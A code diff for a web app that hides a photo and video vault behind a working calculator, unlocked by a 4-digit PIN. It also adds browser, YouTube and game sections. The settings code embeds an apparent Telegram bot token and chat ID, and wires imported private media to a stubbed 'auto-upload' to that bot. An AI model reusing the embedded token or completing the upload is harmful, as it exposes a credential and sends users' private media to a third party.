-    /* === GAMES === */
-    function playGame(url) {
-        const overlay = document.getElementById('game-overlay');
-        const frame = document.getElementById('game-frame');
-        frame.src = url;
-        overlay.classList.remove('hidden');
-    }
-
-    function closeGame() {
-        const overlay = document.getElementById('game-overlay');
-        const frame = document.getElementById('game-frame');
-        frame.src = "";
-        overlay.classList.add('hidden');
-    }
-
-</script>
+        
+        // Show calculator screen
+        function showCalculator() {
+            pinScreen.classList.remove('active');
+            calcScreen.classList.add('active');
+            vaultScreen.classList.remove('active');
+            statusBar.classList.remove('active');
+            vaultContainer.classList.remove('active');
+            bottomNav.classList.remove('active');
+        }
+        
+        // Show vault screen
+        function showVault() {
+            pinScreen.classList.remove('active');
+            calcScreen.classList.remove('active');
+            vaultScreen.classList.add('active');
+            vaultStatusBar.classList.add('active');
+            vaultContainer.classList.add('active');
+            
+            // Show bottom nav with animation
+            setTimeout(() => {
+                bottomNav.classList.add('active');
+            }, 300);
+            
+            // Add unlock animation
+            vaultContainer.classList.add('vault-unlock');
+            setTimeout(() => {
+                vaultContainer.classList.remove('vault-unlock');
+            }, 600);
+            
+            // Load vault content
+            loadGallery();
+            loadVideos();
+        }
+        
+        // Update time display
+        function updateTime() {
+            const now = new Date();
+            const timeStr = now.getHours().toString().padStart(2, '0') + ':' + 
+                          now.getMinutes().toString().padStart(2, '0');
+            
+            document.getElementById('currentTime').textContent = timeStr;
+            document.getElementById('vaultTime').textContent = timeStr;
+        }
+        
+        // PIN Setup Logic
+        function initPinSetup() {
+            const pinBtns = document.querySelectorAll('.pin-btn[data-number]');
+            const pinBackspace = document.getElementById('pinBackspace');
+            const pinConfirm = document.getElementById('pinConfirm');
+            
+            pinBtns.forEach(btn => {
+                btn.addEventListener('click', () => {
+                    if (currentPin.length < 4) {
+                        currentPin += btn.getAttribute('data-number');
+                        updatePinDots();
+                    }
+                });
+            });
+            
+            pinBackspace.addEventListener('click', () => {
+                if (currentPin.length > 0) {
+                    currentPin = currentPin.slice(0, -1);
+                    updatePinDots();
+                }
+            });
+            
+            pinConfirm.addEventListener('click', () => {
+                if (currentPin.length === 4) {
+                    if (!storedPin) {
+                        // Setting PIN for the first time
+                        localStorage.setItem('vaultPin', currentPin);
+                        storedPin = currentPin;
+                        currentPin = '';
+                        updatePinDots();
+                        showCalculator();
+                    }
+                }
+            });
+        }
+        
+        // Update PIN dots display
+        function updatePinDots() {
+            pinDots.forEach((dot, index) => {
+                if (index < currentPin.length) {
+                    dot.classList.add('filled');
+                } else {
+                    dot.classList.remove('filled');
+                }
+            });
+        }
+        
+        // Calculator Logic
+        function initCalculator() {
+            const numberBtns = document.querySelectorAll('[data-number]');
+            const operatorBtns = document.querySelectorAll('[data-action]');
+            const calcCurrent = document.getElementById('calcCurrent');
+            const calcHistory = document.getElementById('calcHistory');
+            
+            // Number buttons
+            numberBtns.forEach(btn => {
+                btn.addEventListener('click', () => {
+                    const number = btn.getAttribute('data-number');
+                    
+                    if (waitingForOperand) {
+                        calculatorValue = number;
+                        waitingForOperand = false;
+                    } else {
+                        calculatorValue = calculatorValue === '0' ? number : calculatorValue + number;
+                    }
+                    
+                    calcCurrent.textContent = calculatorValue;
+                });
+            });
+            
+            // Operator buttons
+            operatorBtns.forEach(btn => {
+                btn.addEventListener('click', () => {
+                    const action = btn.getAttribute('data-action');
+                    
+                    switch(action) {
+                        case 'clear':
+                            calculatorValue = '0';
+                            calculatorHistory = '';
+                            currentOperator = '';
+                            calcHistory.textContent = '';
+                            break;
+                            
+                        case 'toggleSign':
+                            calculatorValue = (parseFloat(calculatorValue) * -1).toString();
+                            break;
+                            
+                        case 'percentage':
+                            calculatorValue = (parseFloat(calculatorValue) / 100).toString();
+                            break;
+                            
+                        case 'decimal':
+                            if (!calculatorValue.includes('.')) {
+                                calculatorValue += '.';
+                            }
+                            break;
+                            
+                        case 'equals':
+                            if (calculatorHistory && currentOperator) {
+                                // Check if this is a vault unlock attempt
+                                if (calculatorValue.length === 4 && /^\d+$/.test(calculatorValue)) {
+                                    if (calculatorValue === storedPin) {
+                                        // Unlock vault!
+                                        showVault();
+                                        calculatorValue = '0';
+                                        calculatorHistory = '';
+                                        currentOperator = '';
+                                        calcHistory.textContent = '';
+                                    }
+                                }
+                                
+                                // Normal calculation
+                                const prev = parseFloat(calculatorHistory);
+                                const current = parseFloat(calculatorValue);
+                                let result = 0;
+                                
+                                switch(currentOperator) {
+                                    case 'add': result = prev + current; break;
+                                    case 'subtract': result = prev - current; break;
+                                    case 'multiply': result = prev * current; break;
+                                    case 'divide': result = prev / current; break;
+                                }
+                                
+                                calculatorValue = result.toString();
+                                calculatorHistory = '';
+                                currentOperator = '';
+                                calcHistory.textContent = '';
+                            }
+                            break;
+                            
+                        default: // +, -, ×, ÷
+                            if (calculatorHistory && currentOperator && !waitingForOperand) {
+                                // Calculate previous operation
+                                const prev = parseFloat(calculatorHistory);
+                                const current = parseFloat(calculatorValue);
+                                let result = 0;
+                                
+                                switch(currentOperator) {
+                                    case 'add': result = prev + current; break;
+                                    case 'subtract': result = prev - current; break;
+                                    case 'multiply': result = prev * current; break;
+                                    case 'divide': result = prev / current; break;
+                                }
+                                
+                                calculatorValue = result.toString();
+                            }
+                            
+                            calculatorHistory = calculatorValue;
+                            currentOperator = action;
+                            waitingForOperand = true;
+                            calcHistory.textContent = calculatorValue + 
+                                (action === 'add' ? ' +' : 
+                                 action === 'subtract' ? ' -' : 
+                                 action === 'multiply' ? ' ×' : ' ÷');
+                            break;
+                    }
+                    
+                    calcCurrent.textContent = calculatorValue;
+                });
+            });
+        }
+        
+        // Vault Initialization
+        function initVault() {
+            // Vault cards
+            document.querySelectorAll('.vault-card').forEach(card => {
+                card.addEventListener('click', function() {
+                    const section = this.getAttribute('data-section');
+                    openSection(section);
+                });
+            });
+            
+            // Back buttons
+            document.querySelectorAll('.section-back').forEach(btn => {
+                btn.addEventListener('click', function() {
+                    const section = this.getAttribute('data-back');
+                    closeSection(section);
+                });
+            });
+            
+            // Navigation
+            document.querySelectorAll('.nav-item').forEach(item => {
+                item.addEventListener('click', function() {
+                    const nav = this.getAttribute('data-nav');
+                    
+                    // Update active state
+                    document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
+                    this.classList.add('active');
+                    
+                    if (nav === 'home') {
+                        // Show vault home
+                        document.getElementById('vaultContainer').style.display = 'flex';
+                        document.querySelectorAll('.section-screen').forEach(screen => {
+                            screen.classList.remove('active');
+                        });
+                    } else {
+                        // Hide vault home, show section
+                        document.getElementById('vaultContainer').style.display = 'none';
+                        openSection(nav);
+                    }
+                });
+            });
+        }
+        
+        // Open a vault section
+        function openSection(section) {
+            // Hide all sections
+            document.querySelectorAll('.section-screen').forEach(screen => {
+                screen.classList.remove('active');
+            });
+            
+            // Show the requested section
+            document.getElementById(section + 'Screen').classList.add('active');
+            
+            // Update navigation
+            document.querySelectorAll('.nav-item').forEach(item => {
+                item.classList.remove('active');
+                if (item.getAttribute('data-nav') === section) {
+                    item.classList.add('active');
+                }
+            });
+        }
+        
+        // Close a section and return to vault home
+        function closeSection(section) {
+            document.getElementById(section + 'Screen').classList.remove('active');
+            document.getElementById('vaultContainer').style.display = 'flex';
+            
+            // Reset navigation to home
+            document.querySelectorAll('.nav-item').forEach(item => {
+                item.classList.remove('active');
+                if (item.getAttribute('data-nav') === 'home') {
+                    item.classList.add('active');
+                }
+            });
+        }
+        
+        // Initialize IndexedDB
+        function initDatabase() {
+            const request = indexedDB.open(DB_NAME, DB_VERSION);
+            
+            request.onerror = function(event) {
+                console.error('Database error:', event.target.error);
+            };
+            
+            request.onupgradeneeded = function(event) {
+                db = event.target.result;
+                
+                // Create object stores
+                if (!db.objectStoreNames.contains('photos')) {
+                    db.createObjectStore('photos', { keyPath: 'id', autoIncrement: true });
+                }
+                
+                if (!db.objectStoreNames.contains('videos')) {
+                    db.createObjectStore('videos', { keyPath: 'id', autoIncrement: true });
+                }
+                
+                if (!db.objectStoreNames.contains('settings')) {
+                    db.createObjectStore('settings', { keyPath: 'key' });
+                }
+            };
+            
+            request.onsuccess = function(event) {
+                db = event.target.result;
+                console.log('Database initialized');
+            };
+        }
+        
+        // Gallery Functions
+        function loadGallery() {
+            if (!db) return;
+            
+            const transaction = db.transaction(['photos'], 'readonly');
+            const store = transaction.objectStore('photos');
+            const request = store.getAll();
+            
+            request.onsuccess = function(event) {
+                const photos = event.target.result;
+                const galleryGrid = document.getElementById('galleryGrid');
+                galleryGrid.innerHTML = '';
+                
+                photos.forEach(photo => {
+                    const item = document.createElement('div');
+                    item.className = 'gallery-item';
+                    item.setAttribute('data-id', photo.id);
+                    
+                    const img = document.createElement('img');
+                    img.className = 'gallery-img';
+                    img.src = photo.data;
+                    img.alt = 'Private photo';
+                    
+                    item.appendChild(img);
+                    item.addEventListener('click', function() {
+                        openFullscreen(photo.id, 'photo', photo.data);
+                    });
+                    
+                    galleryGrid.appendChild(item);
+                });
+            };
+        }
+        
+        function importPhoto() {
+            const input = document.getElementById('photoInput');
+            input.click();
+            
+            input.onchange = function(event) {
+                const files = event.target.files;
+                
+                for (let file of files) {
+                    const reader = new FileReader();
+                    
+                    reader.onload = function(e) {
+                        const photoData = e.target.result;
+                        
+                        // Store in IndexedDB
+                        const transaction = db.transaction(['photos'], 'readwrite');
+                        const store = transaction.objectStore('photos');
+                        
+                        const photo = {
+                            name: file.name,
+                            type: file.type,
+                            size: file.size,
+                            data: photoData,
+                            timestamp: new Date().toISOString()
+                        };
+                        
+                        store.add(photo);
+                        
+                        transaction.oncomplete = function() {
+                            loadGallery();
+                            
+                            // Auto upload to Telegram bot (if configured)
+                            const telegramBotToken = localStorage.getItem('telegramBotToken');
+                            const telegramChatId = localStorage.getItem('telegramChatId');
+                            
+                            if (telegramBotToken && telegramChatId) {
+                                autoUploadToTelegram(photoData, file.name, 'photo');
+                            }
+                        };
+                    };
+                    
+                    reader.readAsDataURL(file);
+                }
+                
+                // Reset input
+                input.value = '';
+            };
+        }
+        
+        // Video Functions
+        function loadVideos() {
+            if (!db) return;
+            
+            const transaction = db.transaction(['videos'], 'readonly');
+            const store = transaction.objectStore('videos');
+            const request = store.getAll();
+            
+            request.onsuccess = function(event) {
+                const videos = event.target.result;
+                const videoList = document.getElementById('videoList');
+                videoList.innerHTML = '';
+                
+                videos.forEach(video => {
+                    const item = document.createElement('div');
+                    item.className = 'video-item';
+                    item.setAttribute('data-id', video.id);
+                    
+                    const thumb = document.createElement('img');
+                    thumb.className = 'video-thumb';
+                    thumb.src = 'data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100" fill="%238a2be2"><rect width="100" height="100" fill="%231a1a24"/><circle cx="50" cy="50" r="30" fill="%238a2be2"/><polygon points="40,35 70,50 40,65" fill="white"/></svg>';
+                    thumb.alt = 'Video thumbnail';
+                    
+                    const info = document.createElement('div');
+                    info.className = 'video-info';
+                    
+                    const name = document.createElement('div');
+                    name.className = 'video-name';
+                    name.textContent = video.name;
+                    
+                    const actions = document.createElement('div');
+                    actions.className = 'video-actions';
+                    
+                    const playBtn = document.createElement('div');
+                    playBtn.className = 'video-action-btn';
+                    playBtn.innerHTML = '<i class="fas fa-play"></i>';
+                    playBtn.addEventListener('click', function(e) {
+                        e.stopPropagation();
+                        openFullscreen(video.id, 'video', video.data);
+                    });
+                    
+                    const deleteBtn = document.createElement('div');
+                    deleteBtn.className = 'video-action-btn';
+                    deleteBtn.innerHTML = '<i class="fas fa-trash"></i>';
+                    deleteBtn.addEventListener('click', function(e) {
+                        e.stopPropagation();
+                        deleteVideo(video.id);
+                    });
+                    
+                    actions.appendChild(playBtn);
+                    actions.appendChild(deleteBtn);
+                    
+                    info.appendChild(name);
+                    info.appendChild(actions);
+                    
+                    item.appendChild(thumb);
+                    item.appendChild(info);
+                    
+                    videoList.appendChild(item);
+                });
+            };
+        }
+        
+        function importVideo() {
+            const input = document.getElementById('videoInput');
+            input.click();
+            
+            input.onchange = function(event) {
+                const files = event.target.files;
+                
+                for (let file of files) {
+                    const reader = new FileReader();
+                    
+                    reader.onload = function(e) {
+                        const videoData = e.target.result;
+                        
+                        // Store in IndexedDB
+                        const transaction = db.transaction(['videos'], 'readwrite');
+                        const store = transaction.objectStore('videos');
+                        
+                        const video = {
+                            name: file.name,
+                            type: file.type,
+                            size: file.size,
+                            data: videoData,
+                            timestamp: new Date().toISOString()
+                        };
+                        
+                        store.add(video);
+                        
+                        transaction.oncomplete = function() {
+                            loadVideos();
+                            
+                            // Auto upload to Telegram bot (if configured)
+                            const telegramBotToken = localStorage.getItem('telegramBotToken');
+                            const telegramChatId = localStorage.getItem('telegramChatId');
+                            
+                            if (telegramBotToken && telegramChatId) {
+                                autoUploadToTelegram(videoData, file.name, 'video');
+                            }
+                        };
+                    };
+                    
+                    reader.readAsDataURL(file);
+                }
+                
+                // Reset input
+                input.value = '';
+            };
+        }
+        
+        function deleteVideo(id) {
+            if (!confirm('Delete this video from vault?')) return;
+            
+            const transaction = db.transaction(['videos'], 'readwrite');
+            const store = transaction.objectStore('videos');
+            store.delete(parseInt(id));
+            
+            transaction.oncomplete = function() {
+                loadVideos();
+                document.getElementById('fullscreenViewer').classList.remove('active');
+            };
+        }
+        
+        // Fullscreen Viewer
+        function openFullscreen(id, type, data) {
+            currentMediaId = id;
+            currentMediaType = type;
+            
+            const viewer = document.getElementById('fullscreenViewer');
+            const img = document.getElementById('fullscreenImg');
+            const video = document.getElementById('fullscreenVideo');
+            const viewerActions = document.getElementById('viewerActions');
+            
+            if (type === 'photo') {
+                img.style.display = 'block';
+                video.style.display = 'none';
+                img.src = data;
+                viewerActions.style.display = 'flex';
+            } else if (type === 'video') {
+                img.style.display = 'none';
+                video.style.display = 'block';
+                video.src = data;
+                viewerActions.style.display = 'flex';
+            }
+            
+            viewer.classList.add('active');
+        }
+        
+        function closeFullscreen() {
+            const viewer = document.getElementById('fullscreenViewer');
+            const video = document.getElementById('fullscreenVideo');
+            
+            video.pause();
+            viewer.classList.remove('active');
+            currentMediaId = null;
+            currentMediaType = null;
+        }
+        
+        function downloadMedia() {
+            if (!currentMediaId || !currentMediaType) return;
+            
+            // Get media from IndexedDB
+            const storeName = currentMediaType === 'photo' ? 'photos' : 'videos';
+            const transaction = db.transaction([storeName], 'readonly');
+            const store = transaction.objectStore(storeName);
+            const request = store.get(parseInt(currentMediaId));
+            
+            request.onsuccess = function(event) {
+                const media = event.target.result;
+                const link = document.createElement('a');
+                link.href = media.data;
+                link.download = media.name;
+                link.click();
+            };
+        }
+        
+        function deleteMedia() {
+            if (!currentMediaId || !currentMediaType) return;
+            
+            if (!confirm(`Delete this ${currentMediaType} from vault?`)) return;
+            
+            const storeName = currentMediaType === 'photo' ? 'photos' : 'videos';
+            const transaction = db.transaction([storeName], 'readwrite');
+            const store = transaction.objectStore(storeName);
+            store.delete(parseInt(currentMediaId));
+            
+            transaction.oncomplete = function() {
+                if (currentMediaType === 'photo') {
+                    loadGallery();
+                } else {
+                    loadVideos();
+                }
+                
+                closeFullscreen();
+            };
+        }
+        
+        // Browser Functions
+        function initBrowser() {
+            const urlInput = document.getElementById('urlInput');
+            const goBtn = document.getElementById('goBtn');
+            const browserFrame = document.getElementById('browserFrame');
+            
+            function loadUrl() {
+                let url = urlInput.value.trim();
+                
+                if (!url.startsWith('http://') && !url.startsWith('https://')) {
+                    // If it's not a URL, treat it as a search
+                    url = 'https://www.google.com/search?q=' + encodeURIComponent(url);
+                }
+                
+                browserFrame.src = url;
+            }
+            
+            goBtn.addEventListener('click', loadUrl);
+            urlInput.addEventListener('keypress', function(e) {
+                if (e.key === 'Enter') loadUrl();
+            });
+        }
+        
+        // YouTube Functions
+        function initYouTube() {
+            const searchInput = document.getElementById('youtubeSearch');
+            const searchBtn = document.getElementById('youtubeSearchBtn');
+            const youtubeList = document.getElementById('youtubeList');
+            
+            // Default videos
+            const defaultVideos = [
+                { id: 'dQw4w9WgXcQ', title: 'Never Gonna Give You Up' },
+                { id: '9bZkp7q19f0', title: 'Gangnam Style' },
+                { id: 'kJQP7kiw5Fk', title: 'Despacito' },
+                { id: 'JGwWNGJdvx8', title: 'Shape of You' },
+                { id: 'RgKAFK5djSk', title: 'See You Again' },
+                { id: 'OPf0YbXqDm0', title: 'Uptown Funk' }
+            ];
+            
+            function loadYouTubeVideos(videos = defaultVideos) {
+                youtubeList.innerHTML = '';
+                
+                videos.forEach(video => {
+                    const item = document.createElement('div');
+                    item.className = 'youtube-item';
+                    
+                    const thumb = document.createElement('img');
+                    thumb.className = 'youtube-thumb';
+                    thumb.src = `https://img.youtube.com/vi/${video.id}/hqdefault.jpg`;
+                    thumb.alt = video.title;
+                    thumb.onerror = function() {
+                        this.src = 'data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100" fill="%23ff0000"><rect width="100" height="100" fill="%231a1a24"/><circle cx="50" cy="50" r="30" fill="%23ff0000"/><polygon points="40,35 70,50 40,65" fill="white"/></svg>';
+                    };
+                    
+                    const title = document.createElement('div');
+                    title.className = 'youtube-title';
+                    title.textContent = video.title;
+                    
+                    item.appendChild(thumb);
+                    item.appendChild(title);
+                    
+                    item.addEventListener('click', function() {
+                        openYouTubePlayer(video.id);
+                    });
+                    
+                    youtubeList.appendChild(item);
+                });
+            }
+            
+            function searchYouTube() {
+                const query = searchInput.value.trim();
+                
+                if (query) {
+                    // For demo purposes, we'll just filter the default videos
+                    const filtered = defaultVideos.filter(video => 
+                        video.title.toLowerCase().includes(query.toLowerCase())
+                    );
+                    
+                    if (filtered.length > 0) {
+                        loadYouTubeVideos(filtered);
+                    } else {
+                        // Add a "no results" video
+                        loadYouTubeVideos([{ id: 'dQw4w9WgXcQ', title: 'No results found for: ' + query }]);
+                    }
+                } else {
+                    loadYouTubeVideos();
+                }
+            }
+            
+            searchBtn.addEventListener('click', searchYouTube);
+            searchInput.addEventListener('keypress', function(e) {
+                if (e.key === 'Enter') searchYouTube();
+            });
+            
+            // Load default videos
+            loadYouTubeVideos();
+        }
+        
+        function openYouTubePlayer(videoId) {
+            // Create a temporary iframe for YouTube
+            const playerScreen = document.createElement('div');
+            playerScreen.className = 'section-screen active';
+            playerScreen.style.zIndex = '2001';
+            playerScreen.style.background = 'black';
+            
+            playerScreen.innerHTML = `
+                <div class="section-header">
+                    <div class="section-back" id="closeYoutubePlayer">
+                        <i class="fas fa-arrow-left"></i>
+                    </div>
+                    <div class="section-title">YouTube Player</div>
+                </div>
+                <div style="flex:1; padding:20px;">
+                    <iframe 
+                        width="100%" 
+                        height="100%" 
+                        src="https://www.youtube.com/embed/${videoId}?autoplay=1&rel=0" 
+                        frameborder="0" 
+                        allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" 
+                        allowfullscreen
+                        style="border-radius:15px;">
+                    </iframe>
+                </div>
+            `;
+            
+            document.body.appendChild(playerScreen);
+            
+            document.getElementById('closeYoutubePlayer').addEventListener('click', function() {
+                document.body.removeChild(playerScreen);
+            });
+        }
+        
+        // Games Functions
+        function initGames() {
+            document.querySelectorAll('.game-card').forEach(card => {
+                card.addEventListener('click', function() {
+                    const game = this.getAttribute('data-game');
+                    openGame(game);
+                });
+            });
+        }
+        
+        function openGame(game) {
+            let gameUrl = '';
+            
+            switch(game) {
+                case 'yeti': gameUrl = 'https://gemioli.com/yetisensation/html5/gemioli/'; break;
+                case 'sling': gameUrl = 'https://gemioli.com/slinguin/html5/gemioli/'; break;
+                case 'saloon': gameUrl = 'https://gemioli.com/thesaloon/html5/gemioli/'; break;
+                case 'pirate': gameUrl = 'https://gemioli.com/thepirateship/'; break;
+            }
+            
+            // Create a temporary iframe for the game
+            const gameScreen = document.createElement('div');
+            gameScreen.className = 'section-screen active';
+            gameScreen.style.zIndex = '2001';
+            gameScreen.style.background = 'black';
+            
+            gameScreen.innerHTML = `
+                <div class="section-header">
+                    <div class="section-back" id="closeGame">
+                        <i class="fas fa-arrow-left"></i>
+                    </div>
+                    <div class="section-title">Playing Game</div>
+                </div>
+                <div style="flex:1; padding:0;">
+                    <iframe 
+                        width="100%" 
+                        height="100%" 
+                        src="${gameUrl}" 
+                        frameborder="0" 
+                        allowfullscreen
+                        style="border:none;">
+                    </iframe>
+                </div>
+            `;
+            
+            document.body.appendChild(gameScreen);
+            
+            document.getElementById('closeGame').addEventListener('click', function() {
+                document.body.removeChild(gameScreen);
+            });
+        }
+        
+        // Settings Functions
+        function initSettings() {
+            const settingsBtn = document.getElementById('settingsBtn');
+            const settingsModal = document.getElementById('settingsModal');
+            const closeSettings = document.getElementById('closeSettings');
+            const resetPinOption = document.getElementById('resetPinOption');
+            const changePinOption = document.getElementById('changePinOption');
+            const clearDataOption = document.getElementById('clearDataOption');
+            const telegramOption = document.getElementById('telegramOption');
+            
+            settingsBtn.addEventListener('click', function() {
+                settingsModal.classList.add('active');
+            });
+            
+            closeSettings.addEventListener('click', function() {
+                settingsModal.classList.remove('active');
+            });
+            
+            resetPinOption.addEventListener('click', function() {
+                if (confirm('Reset PIN? This will log you out and require setting a new PIN.')) {
+                    localStorage.removeItem('vaultPin');
+                    storedPin = null;
+                    currentPin = '';
+                    updatePinDots();
+                    settingsModal.classList.remove('active');
+                    showPinScreen();
+                }
+            });
+            
+            changePinOption.addEventListener('click', function() {
+                const oldPin = prompt('Enter current PIN:');
+                
+                if (oldPin === storedPin) {
+                    const newPin = prompt('Enter new 4-digit PIN:');
+                    
+                    if (newPin && newPin.length === 4 && /^\d+$/.test(newPin)) {
+                        localStorage.setItem('vaultPin', newPin);
+                        storedPin = newPin;
+                        alert('PIN changed successfully!');
+                        settingsModal.classList.remove('active');
+                    } else {
+                        alert('Invalid PIN. Must be 4 digits.');
+                    }
+                } else {
+                    alert('Incorrect current PIN.');
+                }
+            });
+            
+            clearDataOption.addEventListener('click', function() {
+                if (confirm('WARNING: This will delete ALL vault data (photos, videos). Continue?')) {
+                    // Clear IndexedDB
+                    indexedDB.deleteDatabase(DB_NAME);
+                    
+                    // Reinitialize database
+                    setTimeout(() => {
+                        initDatabase();
+                        loadGallery();
+                        loadVideos();
+                        alert('All vault data cleared.');
+                        settingsModal.classList.remove('active');
+                    }, 500);
+                }
+            });
+            
+            telegramOption.addEventListener('click', function() {
+                const botToken = prompt('8559745325:AAFcYDynBLWHPHh2U1eRblNzQGRnPnArXF0:');
+                const chatId = prompt('7692791962:');
+                
+                if (botToken && chatId) {
+                    localStorage.setItem('telegramBotToken', botToken);
+                    localStorage.setItem('telegramChatId', chatId);
+                    alert('Telegram auto-upload configured!');
+                }
+                settingsModal.classList.remove('active');
+            });
+        }
+        
+        // Telegram Auto Upload
+        function autoUploadToTelegram(data, filename, type) {
+            const botToken = localStorage.getItem('telegramBotToken');
+            const chatId = localStorage.getItem('telegramChatId');
+            
+            if (!botToken || !chatId) return;
+            
+            // In a real implementation, you would send this to your backend
+            // For security reasons, we can't make direct API calls from client-side JavaScript
+            // This is a placeholder for the functionality
+            
+            console.log(`[Telegram Auto-Upload] ${type}: ${filename}`);
+            console.log('Bot Token:', botToken ? 'Set' : 'Not set');
+            console.log('Chat ID:', chatId ? 'Set' : 'Not set');
+            
+            // Note: In a production app, this should be done through a secure backend
+            // to avoid exposing the bot token in client-side code
+        }
+        
+        // Event Listeners
+        function initEventListeners() {
+            // Import buttons
+            document.getElementById('importPhotoBtn').addEventListener('click', importPhoto);
+            document.getElementById('importVideoBtn').addEventListener('click', importVideo);
+            
+            // Fullscreen viewer
+            document.getElementById('closeViewer').addEventListener('click', closeFullscreen);
+            document.getElementById('downloadBtn').addEventListener('click', downloadMedia);
+            document.getElementById('deleteBtn').addEventListener('click', deleteMedia);
+            
+            // Initialize sections
+            initBrowser();
+            initYouTube();
+            initGames();
+            initSettings();
+            
+            // Close viewer on escape key
+            document.addEventListener('keydown', function(e) {
+                if (e.key === 'Escape') {
+                    closeFullscreen();
+                    document.getElementById('settingsModal').classList.remove('active');
+                }
+            });
+            
+            // Prevent context menu
+            document.addEventListener('contextmenu', function(e) {
+                e.preventDefault();
+            });
+        }
+        
+        // Initialize the app when DOM is loaded
+        document.addEventListener('DOMContentLoaded', initApp);
+    </script>
 </body>
-  </html>
+        </html>
